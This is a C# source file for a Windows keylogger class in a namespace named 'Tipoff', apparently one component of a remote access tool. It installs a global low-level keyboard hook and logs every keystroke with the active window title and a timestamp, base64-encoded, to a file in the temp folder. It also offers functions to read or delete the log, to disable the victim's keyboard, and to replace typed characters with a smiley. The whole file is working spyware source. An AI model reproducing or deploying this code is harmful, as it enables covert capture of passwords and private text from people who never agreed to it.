using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tipoff
{
    public class KeyLogger
    {
        //SAVE
        public string file_keylogger;

        //STREAM WRITER
        private StreamWriter file_sw;

        //FUN STUFF
        public bool disable_keyboard = false;
        public bool smile_key = false;
        private char char_smile = '☺';

        //NON PRINTABLE KEY
        private readonly Dictionary<int, string> dic_NonPrintableKeys = new Dictionary<int, string>()
        {
            { 0x08, "[Backspace]" },
            { 0x09, "[Tab]" },
            { 0x0D, "[Enter]" },
            { 0x10, "[Shift]" },
            { 0x11, "[Ctrl]" },
            { 0x12, "[Alt]" },
            { 0x13, "[Pause]" },
            { 0x1B, "[Escape]" },
            { 0x20, "[Spacebar]" },
            { 0x21, "[PageUp]" },
            { 0x22, "[PageDown]" },
            { 0x23, "[End]" },
            { 0x24, "[Home]" },
            { 0x25, "[LeftArrow]" },
            { 0x26, "[UpArrow]" },
            { 0x27, "[RightArrow]" },
            { 0x28, "[DownArrow]" },
            { 0x29, "[Insert]" },
            { 0x2A, "[Delete]" },
            { 0x2B, "[Select]" },
            { 0x2C, "[PrintScreen]" },
            { 0x2D, "[Insert]" },
            { 0x2E, "[Delete]" },
            { 0x5B, "[LWin]" },
            { 0x5C, "[RWin]" },
            { 0x5D, "[Apps]" },
            { 0x70, "[F1]" },
            { 0x71, "[F2]" },
            { 0x72, "[F3]" },
            { 0x73, "[F4]" },
            { 0x74, "[F5]" },
            { 0x75, "[F6]" },
            { 0x76, "[F7]" },
            { 0x77, "[F8]" },
            { 0x78, "[F9]" },
            { 0x79, "[F10]" },
            { 0x7A, "[F11]" },
            { 0x7B, "[F12]" },
            { 0x90, "[NumLock]" },
            { 0x91, "[ScrollLock]" },
            { 0xA0, "[LeftShift]" },
            { 0xA1, "[RightShift]" },
            { 0xA2, "[LeftCtrl]" },
            { 0xA3, "[RightCtrl]" },
            { 0xA4, "[LeftAlt]" },
            { 0xA5, "[RightAlt]" },
            { 0xA6, "[BrowserBack]" },
            { 0xA7, "[BrowserForward]" },
            { 0xA8, "[BrowserRefresh]" },
            { 0xA9, "[BrowserStop]" },
            { 0xAA, "[BrowserSearch]" },
            { 0xAB, "[BrowserFavorites]" },
            { 0xAC, "[BrowserHome]" },
            { 0xB0, "[Mute]" },
            { 0xB1, "[VolumeDown]" },
            { 0xB2, "[VolumeUp]" },
            { 0xB3, "[NextTrack]" },
            { 0xB4, "[PreviousTrack]" },
            { 0xB5, "[StopMedia]" },
            { 0xB6, "[PlayPauseMedia]" },
            { 0xB7, "[LaunchMail]" },
            { 0xB8, "[SelectMedia]" },
            { 0xB9, "[LaunchApplication1]" },
            { 0xBA, "[Semicolon]" },
            { 0xBB, "[Plus]" },
            { 0xBC, "[Comma]" },
            { 0xBD, "[Minus]" },
            { 0xBE, "[Period]" },
            { 0xBF, "[Slash]" },
            { 0xC0, "[GraveAccent]" }
        };

        public KeyLogger(string fileName = "keylogger.rtf")
        {
            file_keylogger = Path.Combine(new string[] { Path.GetTempPath(), fileName });
        }

        private static IntPtr _hookID = IntPtr.Zero;

        public void Start()
        {
            if (file_sw != null)
                try { file_sw.Close(); } catch { }

            if (!File.Exists(file_keylogger))
            {
                if (!Directory.Exists(Path.GetDirectoryName(file_keylogger)))
                {

                }
                File.Create(file_keylogger).Close();
            }

            new Thread(() =>
            {
                _hookID = SetHook(HookCallback);
                while (true)
                {
                    try
                    {
                        Application.DoEvents();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }).Start();
        }
        public void Stop()
        {
            WinAPI.UnhookWindowsHookEx(_hookID);
            file_sw.Close();
        }
        public string Read()
        {
            if (File.Exists(file_keylogger))
            {
                return File.ReadAllText(file_keylogger);
            }

            return string.Empty;
        }
        public (int, string) NewFile()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                File.WriteAllText(file_keylogger, string.Empty);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }
        public (int, string) Delete()
        {
            int code = 1;
            string msg = null;

            try
            {
                File.Delete(file_keylogger);

                msg = "OK";
            }
            catch (Exception ex)
            {
                msg = ex.Message;
            }

            msg = Crypto.b64E2Str(msg);

            return (code, msg);
        }

        private IntPtr SetHook(WinAPI.LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return WinAPI.SetWindowsHookEx(WinAPI.WH_KEYBOARD_LL, proc, WinAPI.GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WinAPI.WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;

                    // Handle specific key presses here
                    byte[] keyState = new byte[256];
                    byte[] keyOutput = new byte[2];

                    // Get the current state of the keyboard
                    string str_key = string.Empty;
                    if (WinAPI.ToAscii((uint)vkCode, 0, keyState, keyOutput, 0) == 1)
                    {
                        if (dic_NonPrintableKeys.Keys.Contains(vkCode))
                        {
                            str_key = dic_NonPrintableKeys[vkCode];
                        }
                        else
                        {
                            char key_char = (char)keyOutput[0];
                            str_key = key_char.ToString();
                        }
                    }
                    else
                    {
                        if (dic_NonPrintableKeys.Keys.Contains(vkCode))
                        {
                            str_key = dic_NonPrintableKeys[vkCode];
                        }
                        else
                        {
                            str_key = $"[{key.ToString()}]";
                        }
                    }
                    File.AppendAllText(file_keylogger, Crypto.b64E2Str($"{Crypto.b64E2Str(Global.GetActiveWindowTitle())}|{Crypto.b64E2Str(DateTime.Now.ToString("F"))}|{Crypto.b64E2Str(str_key)}"));
                    File.AppendAllText(file_keylogger, Environment.NewLine);

                    if (disable_keyboard)
                        return (IntPtr)1;

                    if (smile_key && (char.IsDigit((char)keyOutput[0]) || char.IsLetter((char)keyOutput[0])))
                    {
                        SendKeys.Send(char_smile.ToString());
                        return (IntPtr)1;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            return WinAPI.CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}
